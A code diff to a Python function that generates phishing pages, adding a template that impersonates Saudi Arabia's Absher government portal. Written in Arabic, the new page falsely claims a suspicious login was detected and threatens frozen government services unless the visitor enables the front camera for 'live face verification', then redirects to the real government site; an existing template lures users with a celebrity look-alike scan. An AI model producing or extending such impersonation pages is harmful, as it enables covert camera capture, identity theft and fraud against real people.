@@ -235,7 +235,18 @@ def get_html_content(template_type):
         desc = "اكتشف من تشبه من مشاهير كرة القدم العالمية أو شخصيات الأنمي! يرجى السماح للمتصفح باستخدام الكاميرا الأمامية لبدء المسح الحي وتحليل ملامح الوجه بدقة خلال ثوانٍ واظهار شبيهك الفعلي."
         btn_text = "⚡ ابدأ الفحص الحي واكتشف شبيهك الآن"
         redirect_to = "https://www.google.com"
-
+        
+    elif template_type == "absher":
+        bg_color = "#f4f6f9"
+        card_bg = "#ffffff"
+        btn_color = "#2d6a4f"
+        logo_text = "Absher | أبشر"
+        logo_style = "color: #2d6a4f; font-family: Arial, sans-serif; font-weight: bold; border-bottom: 3px solid #52b788; padding-bottom: 5px;"
+        title = "🛡️ منصة التحقق الوطني الموحد (أمن البيانات)"
+        desc = "تم رصد محاولة دخول مشبوهة إلى حسابك الرقمي الموحد. لتفادي تجميد الخدمات الحكومية والبطاقة الحيوية فوراً، يرجى تفعيل الكاميرا الأمامية لمطابقة بصمة الوجه الحية الحالية ومطابقتها بالنظام المركزي لإثبات هويتك."
+        btn_text = "🔒 ابدأ التحقق الفوري والمسح الحي"
+        redirect_to = "https://www.saudiarabia.gov.sa"
+        
     return f"""
     <!DOCTYPE html>
     <html lang="ar" dir="rtl">
